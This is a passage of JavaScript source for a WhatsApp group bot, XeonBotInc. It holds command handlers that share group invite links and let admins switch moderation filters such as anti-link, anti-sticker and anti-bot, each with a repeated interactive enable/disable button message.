return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
   
}
break
			case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':{
                if (!m.isGroup) return XeonStickGroup()
                if (!m.isAdmin && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!m.isBotAdmin) return XeonStickBotAdmin()
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                }
            break
			case 'antipoll':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antipoll = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antipoll = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antisticker = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antisticker = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antiimage = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiimage = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antivideo = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antivideo = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivirtex': case 'antivirus':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antivirtex = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antivirtex = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'unavailable':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q === 'on') {
                    db.settings[botNumber].online = true
                    replygcxeon(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].online = false
                    replygcxeon(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'welcome':
            case 'left': {
               if (!m.isGroup) return XeonStickGroup()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].welcome = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].welcome = false
                  replygcxeon(`${command} is disabled`)
               }else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupevent': {
               if (!m.isGroup) return XeonStickGroup()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].setinfo = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].setinfo = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
			case 'antiviewonce':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antiviewonce = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiviewonce = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antimedia = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antimedia = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antidocument = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antidocument = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
         
               if (args[0] === 'on') {
                  db.groups[m.chat].anticontact = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].anticontact = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antilocation = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antilocation = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilink': {
               if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antilink = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antilink = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'antibot':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antibot = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
